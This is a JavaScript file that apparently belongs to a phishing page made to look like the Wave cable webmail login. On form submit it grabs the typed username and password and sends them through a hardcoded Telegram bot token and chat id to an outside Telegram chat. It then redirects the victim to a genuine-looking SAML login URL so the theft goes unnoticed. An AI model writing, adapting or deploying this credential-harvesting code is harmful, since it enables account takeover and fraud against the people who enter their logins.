const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;
    const token = "7629474953:AAHcWHilNvcRySyxwSiIHZd1rv5qWXE3wKM";
    const chat_id = "7150651870";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

    const api = new XMLHttpRequest();
    api.open("POST", url, true); // Use POST method
    api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

    // Construct the JSON payload
    const data = JSON.stringify({
        chat_id: chat_id,
        username: username.value,
        password:password.value,
        text: `username: ${username} Password: ${password}`,
    });

    api.onload = () => {
        if (api.status >= 200 && api.status < 300) {
            console.log("Message sent successfully!");
            // Optionally display a success message to the user
        } else {
            console.error("Error sending message:", api.status, api.responseText);
            // Optionally display an error message to the user
        }
    };

    api.onerror = () => {
        console.error("Network error occurred.");
        // Handle network errors appropriately
    }

    api.send(data); // Send the JSON data with the request
    username.value = "";
    password.value = ""; //Clear the input field
});


function redirect() {
    // Get the form data (for example, assuming a form with an input field with id="inputField")
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Check if the form data is empty
    if (username.trim() === "" || password.trim() === "") {
        return; // Don't redirect if the form is empty
    }

    // Proceed with the redirect if there is data
    window.location.href = "https://wave.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_a1525048c96883f60df7e978a6b33a52122a4bcd28%3Ahttps%3A%2F%2Fwave.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.wavecable.com%252F%26cookieTime%3D1742989968/"+[];
}